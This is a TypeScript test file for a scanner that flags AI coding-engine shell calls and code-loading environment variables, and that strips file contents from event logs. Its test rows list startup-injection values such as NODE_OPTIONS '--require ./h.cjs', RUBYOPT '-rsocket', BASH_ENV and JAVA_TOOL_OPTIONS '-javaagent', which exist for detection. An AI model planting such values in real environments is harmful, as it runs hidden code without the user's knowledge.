      expect(engineEnvLoadsCode(name!, value), name).toBe(false);
    }
    for (const [name, value] of [["NODE_OPTIONS", "--max-old-space-size=8192 --require ./h.cjs"], ["NODE_OPTIONS", "-r ./h.cjs"], ["NODE_OPTIONS", "--import=data:x"],
      ["NODE_OPTIONS", "--experimental-loader ./l.mjs"], ["RUBYOPT", "-rsocket"], ["PYTHONSTARTUP", "/tmp/s.py"], ["PERL5OPT", "-Mx"], ["BASH_ENV", "/tmp/h.sh"],
      ["ENV", "/tmp/e.sh"], ["JAVA_TOOL_OPTIONS", "-javaagent:/tmp/a.jar"]]) {
      expect(engineEnvLoadsCode(name!, value), `${name}=${value}`).toBe(true);
    }
    // the null device loads nothing (Murage's own neutral pin BASH_ENV=/dev/null)
    for (const [name, value] of [["BASH_ENV", "/dev/null"], ["ENV", "NUL"], ["PYTHONSTARTUP", " /dev/null "]]) expect(engineEnvLoadsCode(name!, value), `${name}=${value}`).toBe(false);
  });
  // 1.0.18 close: drivers that build an engine env WITHOUT cloudTurnEnvironment (handedEngineEnv's owner map, a driver's own
  // map) reach the check at the one engine spawn point, spawnCli
  it("1.0.18 close: an engine spawned through spawnCli with a code-loading value turns the relief off; a memory flag does not", async () => {
    const run = (env: NodeJS.ProcessEnv) => new Promise<void>((resolve) => {
      const child = spawnCli(process.execPath, ["-e", "0"], { env, stdio: ["pipe", "pipe", "pipe"] });
      child.on("close", () => resolve());
      child.on("error", () => resolve());
    });
    await run({ PATH: process.env.PATH, NODE_OPTIONS: "--max-old-space-size=512", BASH_ENV: "/dev/null" });
    expect(engineEnvDenied()).toBe(false);
    await run({ PATH: process.env.PATH, PERL5OPT: "-Mstrict" });
    expect(engineEnvDenied()).toBe(true);
    expect(toolStartOutside(shell("node build.js"))).toBe("interpreter");
  });
  it("1.0.18 close: every engine spawn site goes through spawnCli or handedEngineEnv (source check)", () => {
    const src = (f: string) => readFileSync(new URL(`./${f}`, import.meta.url), "utf8");
    expect(src("procs.ts")).toMatch(/noteEngineEnv\(opts\.env \?\? process\.env\)/);
    expect(src("engine-env.ts")).toMatch(/noteEngineEnv\(handed\.env\)/);
  });
});

// C: rows that were GREEN `[]` and are intended to MARK. Each block cites the rule that changed it. Never deleted.
describe("C: rows the H6 allowlist intentionally moves from `[]` to MARK", () => {
  const mark = (rows: readonly string[]) => { for (const t of rows) expect(outsideScanMarks(t), t).toContain("interpreter"); };
  it("design 4.3 (replaces :126 and :274-278): an option or subcommand before the script marks", () => mark([
    "python3 -m pytest", "bun test",
    "python3 -W ignore script.py", "python3 -m pytest -k x", "python3 -u tools/run.py -e prod", "node --max-old-space-size=4096 build.js",
    "node --title t server.js", "ruby -W0 app.rb", "perl -I lib script.pl", "pwsh -NoProfile -File ./x.ps1", "bun run build",
  ]));
  it("design 4.3 (replaces :304-311 except the two --version rows): known-harmless options mark now", () => mark([
    "ruby -C sub app.rb", "ruby -I lib app.rb", "ruby -Ilib app.rb", "ruby -w -W0 app.rb", "ruby --disable=gems app.rb",
    "perl -I lib -Mstrict -w script.pl", "perl -Mstrict script.pl", "perl -l0 -an script.pl", "perl -T script.pl",
    "python3 -X importtime app.py", "python3 -W ignore -u -B app.py", "python3 -I -S app.py", "py -3.11 app.py",
    "node --enable-source-maps --no-warnings build.js", "node --test", "node --inspect=9229 server.js", "node --env-file .env app.js",
    "node --experimental-strip-types app.ts", "deno run --allow-net --no-check main.ts", "deno run --config deno.json main.ts",
    "bun run --hot dev", "php -f x.php", "php -n -d memory_limit=1G x.php", "lua -l socket x.lua",
    "pwsh -NoProfile -NonInteractive -File x.ps1", "pwsh -nop -ExecutionPolicy Bypass -File x.ps1", "pwsh -ExecutionPolicy:Bypass -File x.ps1",
  ]));
  // MurageMain env ruling 11-06 (E1 any assignment, E2 an env word before the interpreter; replaces SAFE_ENV), design 4.2 rows
  it("MurageMain env ruling 11-06: assignments and env words before an interpreter mark", () => mark([
    "NODE_ENV=production node server.js", "PYTHONUNBUFFERED=1 python3 app.py", "sh -c 'NODE_ENV=production node server.js'", "env python3 app.py",
  ]));
  // MurageMain order 11-06 (master gate M1 / mechanism M2): wrappers, quotes, `~`, redirections, pipes and backslashes mark
  it("MurageMain order 11-06 (master gate M1 / mechanism M2): design 4.2 rows outside the plain shape mark", () => mark([
    "nice -n 5 python3 app.py", "timeout 5 node app.js", "python3 ~/w/app.py", "python3 'my app.py'", "sh -c 'python3 app.py'",
    "which python3", "command -v node", "python3 app.py > out.txt 2>&1", "python3 app.py | tee log.txt", "python3 app.py --sep '\\t'",
  ]));
  // GrokBuild #10 (bunfig.toml preload), #12 (sitecustomize), #14 (deno.json import map): with no disk probe the scan cannot
  // see the startup file, so the python, bun and deno families mark (the same rows stay `[]` in 4.2 on a disk without one)
  it("GrokBuild #10/#12/#14 (no disk probe: the family marks): design 4.2 python/bun/deno rows", () => mark([
    "python3 hello.py", "python3 script.py -c conf.ini", "python3 script.py -xc x", "deno run main.ts", "deno main.ts", "bun app.ts", "bun run app.ts",
    "PYTHON3 script.py", "python3 C:/w/app.py", "python3 app.py", "python3",
  ]));
  // GrokBuild #11: a profile loads on every pwsh/powershell script shape (`-NoProfile` stays marked: design 4.1 :347, 4.3 rows)
  it("GrokBuild #11 (pwsh profiles): design 4.2 pwsh/powershell rows mark", () => mark([
    "pwsh ./x.ps1", "pwsh -File build.ps1 -c x", "powershell -File x.ps1", "pwsh -File build.ps1",
  ]));
  // the same GrokBuild rulings on the earlier S1 4.1 (U15) and Astra r1 H6 `[]` rows (moved here, never deleted)
  it("GrokBuild #11/#12/#14 on the S1 4.1 and Astra r1 H6 rows", () => mark([
    "python3 hello.py", "python3 script.py -c conf.ini", "deno run main.ts", "pwsh -File build.ps1 -c x", "pwsh ./x.ps1", "powershell -File x.ps1",
  ]));
});

// 4A is option (a) on this lane (MurageMain 11-06 ruling after Astra r2): the r4 scan marks every registry install and every
// git remote verb; option (b) moved to its own Fable redesign lane. These rows pin (a): more marks, never fewer.
describe("4A option (a): registry installs and git remote verbs mark", () => {
  it("every language package manager install, build or runner marks `package install`", () => {
    for (const text of [
      "npm install left-pad", "npm i", "npm ci", "npm install -D vitest@^3", "pnpm add -D vitest", "pnpm install --frozen-lockfile",
      "yarn add @types/node", "yarn install", "bun add zod", "pip install requests", "pip3 install requests==2.32.3",
      "pip install -rdeps.txt", "uv sync", "uv pip install rich", "uv add httpx", "cargo build", "cargo build --release",
      "cargo add serde", "cargo install ripgrep", "gem install rake", "bundle install", "npx vitest run", "pnpx tsc -b",
      "uvx ruff check src", "pipx run black src", "npm install left-pad && npm test", "go get github.com/a/b",
      "cd sub && npm install", "npm --prefix frontend install", "brew install jq", "apt-get install -y jq",
    ]) expect(outsideScanMarks(text), text).toContain("package install");
  });
  it("every git remote verb marks `git`, whatever the remote's name or case", () => {
    for (const text of [
      "git pull", "git fetch", "git push", "git pull origin main", "git fetch Origin", "git push -u origin feat/x", "git status && git pull",
      "git pull upstream main", "git fetch https://github.com/a/b", "git fetch --all", "git submodule update --remote", "git lfs pull",
      "git -C ../x pull", "git ls-remote origin", "git remote update", "git-fetch upstream",
    ]) expect(outsideScanMarks(text), text).toContain("git");
  });
  it("the wire judges an install the same whatever folder the call names", () => {
    const shell = (command: string, cwd?: string): ToolStart => ({ origin: "engine", title: "Bash", input: { command, ...(cwd ? { cwd } : {}) } });
    expect(toolStartOutside(shell("npm install left-pad"))).toBe("package install");
    expect(toolStartOutside(shell("npm install left-pad", "/other"))).toBe("package install");
    expect(toolStartOutside(shell("export PIP_CONFIG_FILE=private.conf; pip install widget"))).toBe("package install");
  });
});

// Astra r2 #8 (MurageMain 11-06): a Codex edit copies its whole `changes` (diff text) into item.started.input; the event log
// keeps the paths, never the file text. Every engine's file-content input fields are stripped at the logger.
describe("Astra r2 #8: the event log never keeps a tool start's file text", () => {
  const SECRET = "confidential-plan-text-7f3a";
  it("a Codex fileChange start keeps its paths and kinds, not its diffs", () => {
    const event = {
      type: "item.started", itemType: "tool", origin: "engine", threadId: "t1", turnId: "turn-1", itemId: "i1", title: "edit",
      toolIdentity: { name: "edit" }, callKey: "i1",
      input: { changes: [
        { path: "/w/notes.md", kind: { type: "update", move_path: null }, diff: `@@ -1 +1 @@\n-old\n+${SECRET}\n` },
        { path: "/w/new.md", kind: "add", content: SECRET },
      ] },
    } as unknown as RuntimeEvent;
    const logged = loggedRuntimeEvent(event) as unknown as { input: { changes: unknown } };
    const text = JSON.stringify(logged);
    expect(text).not.toContain(SECRET);
    expect(text).not.toContain("callKey");
    expect(logged.input.changes).toEqual([{ path: "/w/notes.md", kind: "update" }, { path: "/w/new.md", kind: "add" }]);
    // the live stream never carried the input at all
    expect(JSON.stringify(windowRuntimeEvent(event))).not.toContain(SECRET);
  });
  it("write content, edit text and patches are stripped for every engine; other input stays", () => {
    for (const input of [
      { file_path: "/w/a.md", content: SECRET }, { file_path: "/w/a.md", old_string: "x", new_string: SECRET },
      { file_path: "/w/a.md", edits: [{ old_string: "x", new_string: SECRET }] }, { notebook_path: "/w/a.ipynb", new_source: SECRET },
      { path: "/w/a.md", oldText: "x", newText: SECRET }, { path: "/w/a.md", old_str: "x", new_str: SECRET }, { patch: `+${SECRET}` },
      { diff: `+${SECRET}` }, { path: "/w/a.md", file_text: SECRET }, { path: "/w/a.md", contents: SECRET }, { unified_diff: SECRET },
    ]) {
      const event = { type: "item.started", itemType: "tool", origin: "engine", threadId: "t1", turnId: "turn-1", title: "Write", input } as unknown as RuntimeEvent;
      const logged = loggedRuntimeEvent(event) as unknown as { input: Record<string, unknown> };
      expect(JSON.stringify(logged), JSON.stringify(input)).not.toContain(SECRET);
      for (const key of ["file_path", "notebook_path", "path"]) if (key in input) expect(logged.input[key]).toBe((input as Record<string, unknown>)[key]);
    }
    const shell = { type: "item.started", itemType: "tool", origin: "engine", threadId: "t1", turnId: "turn-1", title: "Bash", input: { command: "ls", cwd: "/w" } } as unknown as RuntimeEvent;
    // NOLIMITS 1.0.18 (design NOLIMITS-S1S2-H6-ALLOWLIST.md L1/L4, LOGGER-REDESIGN 4.3 row 8 class C, MurageMain order 11-06):
    // REPLACES `expect(loggedRuntimeEvent(shell)).toEqual(shell)`, which pinned the denylist. A shell start logs its cwd only.
    // GrokBuild r1 G13: the whole projected row is pinned (toEqual, as the old pin was), and the command appears nowhere in it
    const loggedShell = loggedRuntimeEvent(shell) as unknown as Record<string, unknown>;
    expect(loggedShell).toEqual({ type: "item.started", itemType: "tool", origin: "engine", threadId: "t1", turnId: "turn-1", title: "tool", input: { cwd: "/w" } });
    expect(JSON.stringify(loggedShell)).not.toMatch(/\bls\b/);
  });
});

// NOLIMITS 1.0.18 envfix (Astra acct5 r1 on 8391fd5c2 items 1, 2, 4, 7; GrokBuild r1 G1, G7): tests first, red on 73d6335ec.
describe("1.0.18 envfix: engine PATH, command folder, session edits, option variables", () => {
  afterEach(() => forgetEngineEnv());
  const sh = (command: string, extra: Record<string, unknown> = {}): ToolStart => ({ origin: "engine", title: command, toolIdentity: { name: "shell" }, input: { command, ...extra } });
  const enginePath = ["/usr/local/bin", "/usr/bin", "/bin"].join(delimiter);
  it("H2 / G1: a thread never noted, an unknown PATH, a relative entry or past 64 folders marks a bare program; the noted PATH is searched, never the server's", () => {
    forgetEngineEnv();
    const root = mkdtempSync(join(tmpdir(), "nlmi-h2-"));
    const bin = join(root, "bin");
    const cwd = join(root, "w");
    mkdirSync(bin); mkdirSync(cwd);
    symlinkSync(process.execPath, join(bin, "runner"));
    const run = (path: string | null | "never", command: string) => {
      forgetOutsideState(); forgetEngineEnv(); wire();
      if (path !== "never") noteEnginePath("t1", path);
      noteToolStartOutside("t1", sh(command), cwd);
      return turnOutsideRead("t1");
    };
    expect(run("never", "ls -la")).toBe("interpreter");
    expect(run(null, "ls -la")).toBe("interpreter");
    expect(run(`relative${delimiter}${enginePath}`, "ls -la")).toBe("interpreter");
    expect(run(Array.from({ length: 65 }, (_, i) => join(root, `d${i}`)).join(delimiter), "ls -la")).toBe("interpreter");
    expect(run(`${bin}${delimiter}${enginePath}`, "ls -la")).toBeNull();
    // the runner is only on the ENGINE's PATH: the server's PATH never finds it
    expect(run(`${bin}${delimiter}${enginePath}`, "runner -e 0")).toBe("interpreter");
    expect(run(enginePath, "runner -e 0")).toBeNull();
  });
  it("H2 / G1: spawnCli notes the PATH the child gets for the thread it names (no manual noteEnginePath)", async () => {
    forgetOutsideState(); forgetEngineEnv(); wire();
    const root = mkdtempSync(join(tmpdir(), "nlmi-h2s-"));
    const bin = join(root, "bin");
    const cwd = join(root, "w");
    mkdirSync(bin); mkdirSync(cwd);
    symlinkSync(process.execPath, join(bin, "runner"));
    await new Promise<void>((resolve) => {
      const child = spawnCli(process.execPath, ["-e", "0"], { env: { PATH: `${bin}${delimiter}${enginePath}` }, stdio: ["pipe", "pipe", "pipe"] }, undefined, undefined, "t1");
      child.on("close", () => resolve());
      child.on("error", () => resolve());
    });
    noteToolStartOutside("t1", sh("runner -e 0"), cwd);
    expect(turnOutsideRead("t1")).toBe("interpreter");
  });
  it("H4: a shell call's own folder builds the disk hooks; a relative, malformed or disagreeing folder marks", () => {
    const root = mkdtempSync(join(tmpdir(), "nlmi-h4-"));
    const w = join(root, "w");
    const p = join(root, "p");
    mkdirSync(w); mkdirSync(p);
    writeFileSync(join(p, "bunfig.toml"), "preload = ['./hook.ts']\n");
    const run = (input: Record<string, unknown>) => {
      forgetOutsideState(); forgetEngineEnv(); wire(); noteEnginePath("t1", enginePath);
      noteToolStartOutside("t1", { origin: "engine", title: "shell", toolIdentity: { name: "shell" }, input }, w);
      return turnOutsideRead("t1");
    };
    expect(run({ command: "bun app.ts", cwd: p })).toBe("interpreter");
    expect(run({ command: "bun app.ts", cwd: w })).toBeNull();
    for (const bad of [{ cwd: "p" }, { cwd: 5 }, { cwd: p, workdir: w }, { cwd: "" }]) expect(run({ command: "ls", ...bad }), JSON.stringify(bad)).toBe("outside tool");
  });
  it("H1: a file an engine tool writes on a clean turn is a session edit, and running it on a later turn marks", () => {
    const cwd = mkdtempSync(join(tmpdir(), "nlmi-h1-"));
    forgetOutsideState(); wire(); noteEnginePath("t1", enginePath);
    noteToolStartOutside("t1", { origin: "engine", title: "Write", input: { file_path: join(cwd, "run.js"), content: "0" } }, cwd);
    expect(turnOutsideRead("t1")).toBeNull();
    writeFileSync(join(cwd, "run.js"), "0\n");
    beginOutsideTurn("t1", "i1", "turn-2", true);
    noteToolStartOutside("t1", sh("node other.js"), cwd);
    expect(turnOutsideRead("t1")).toBeNull();
    noteToolStartOutside("t1", sh("node run.js"), cwd);
    expect(turnOutsideRead("t1")).toBe("interpreter");
  });
  it("H1 (relay 5 rule): an ask is judged before its answer and records no session edit; only the allowed call (register) does", () => {
    const cwd = mkdtempSync(join(tmpdir(), "nlmi-h1a-"));
    const write = { origin: "engine" as const, title: "Edit", toolKind: "edit", input: { path: join(cwd, "run.js") } } as ToolStart;
    // Turns begin a minute ahead of the disk: run.js is past the 2 s freshness slack (ctime cannot be aged), so only a session edit can mark it.
    forgetOutsideState(); wireOutsideStore(fileOutsideStore(join(mkdtempSync(join(tmpdir(), "nlmi-s1s2-")), "s.jsonl")), () => Date.now() + 60_000); beginOutsideTurn("t1", "i1", "turn-1", false); noteEnginePath("t1", enginePath);
    // the ask (register false): the owner may still deny it, so it writes nothing yet
    noteAcpCallOutside("t1", write, cwd, false);
    expect(turnOutsideRead("t1")).toBeNull();
    writeFileSync(join(cwd, "run.js"), "0\n");
    beginOutsideTurn("t1", "i1", "turn-2", true);
    noteToolStartOutside("t1", sh("node run.js"), cwd);
    expect(turnOutsideRead("t1")).toBeNull();
    // allowed (registerOnAllow judges it again with register true): now it is the session's edit, and a later run marks
    noteAcpCallOutside("t1", write, cwd, true);
    beginOutsideTurn("t1", "i1", "turn-3", true);
    noteToolStartOutside("t1", sh("node run.js"), cwd);
    expect(turnOutsideRead("t1")).toBe("interpreter");
  });
  it("R7 on an unknown lookup: an installer looked up on a noted PATH that cannot be searched registers as an unknown PATH", () => {
    const cwd = mkdtempSync(join(tmpdir(), "nlmi-r7u-"));
    forgetOutsideState(); forgetEngineEnv(); wire();
    noteEnginePath("t1", `relative${delimiter}${enginePath}`);
    expect(installPathUnknown()).toBe(false);
    noteToolStartOutside("t1", sh("npm install left-pad"), cwd);
    expect(installPathUnknown()).toBe(true);
    // a PATH that is searched completely registers the installer's own folders only
    forgetOutsideState(); forgetEngineEnv(); wire();
    noteEnginePath("t1", enginePath);
    noteToolStartOutside("t1", sh("npm install left-pad"), cwd);
    expect(installPathUnknown()).toBe(false);
  });
  it("H7: NODE_OPTIONS is read the way Node splits it; a value Node cannot split marks; memory flags never mark", () => {
    expect(nodeOptionWords('"--require=/w/a b.cjs" --x')).toEqual(["--require=/w/a b.cjs", "--x"]);
    expect(nodeOptionWords('"open')).toBeNull();
    for (const v of ['"--require=/w/hook.cjs"', '"--require" /w/h.cjs', '--max-old-space-size=512 "-r" ./h.cjs', '"-r./h.cjs"', '"--import=data:x"',
      '--experimental-loader="./l.mjs"', '"--max-old-space-size=8192', '"x\\', "--env-file=.env", "--require\t./h.cjs", "'--require=/w/h.cjs'"]) {
      expect(engineEnvLoadsCode("NODE_OPTIONS", v), v).toBe(true);
    }
    for (const v of ["--max-old-space-size=8192", '"--max-old-space-size=8192" --stack-size=2000', '--enable-source-maps "--max-semi-space-size=64"']) {
      expect(engineEnvLoadsCode("NODE_OPTIONS", v), v).toBe(false);
    }
    for (const v of ['"-rsocket"', "-w -rx", "-wrx", "-I/w/lib", "'-r' x"]) expect(engineEnvLoadsCode("RUBYOPT", v), v).toBe(true);
    for (const v of ["-W0", "-W:no-experimental", "-w", "--disable-gems"]) expect(engineEnvLoadsCode("RUBYOPT", v), v).toBe(false);
    for (const v of ['"--preload=./p.ts"', '"-r" ./p.ts', "--config=./b.toml", '"-c./b.toml"']) expect(engineEnvLoadsCode("BUN_OPTIONS", v), v).toBe(true);
    expect(engineEnvLoadsCode("BUN_OPTIONS", "--smol")).toBe(false);
    for (const v of ['"-javaagent:/a.jar"', "@/w/args", '"@/w/args"', "--patch-module java.base=/w/p"]) expect(engineEnvLoadsCode("JAVA_TOOL_OPTIONS", v), v).toBe(true);
    expect(engineEnvLoadsCode("JDK_JAVA_OPTIONS", '-Xmx2g "-Xss4m"')).toBe(false);
    // Astra's row: the quoted value turns the relief off, and `node app.js` then marks
    noteEngineEnv({ NODE_OPTIONS: '"--require=/w/hook.cjs"' });
    expect(outsideScanMarks("node app.js", { ...disk({ "/w/app.js": "file" }), engineEnv: engineEnvDenied() })).toContain("interpreter");
  });
  it("G7: execCli and execCliSync note the env a probe runs with; a memory-only NODE_OPTIONS leaves the relief on", async () => {
    forgetEngineEnv();
    const sync = (env: NodeJS.ProcessEnv) => execCliSync(process.execPath, ["--version"], { env, timeout: 10_000, maxBuffer: 1 << 20 });
    sync({ PATH: enginePath, NODE_OPTIONS: "--max-old-space-size=512" });
    expect(engineEnvDenied()).toBe(false);
    sync({ PATH: enginePath, PERL5OPT: "-Mstrict" });
    expect(engineEnvDenied()).toBe(true);
    forgetEngineEnv();
    const run = (env: NodeJS.ProcessEnv) => new Promise<void>((resolve) => execCli(process.execPath, ["--version"], { env, timeout: 10_000 }, () => resolve()));
    await run({ PATH: enginePath, NODE_OPTIONS: "--max-old-space-size=512" });
    expect(engineEnvDenied()).toBe(false);
    await run({ PATH: enginePath, NODE_OPTIONS: '"--require=/w/hook.cjs"' });
    expect(engineEnvDenied()).toBe(true);
  });
});
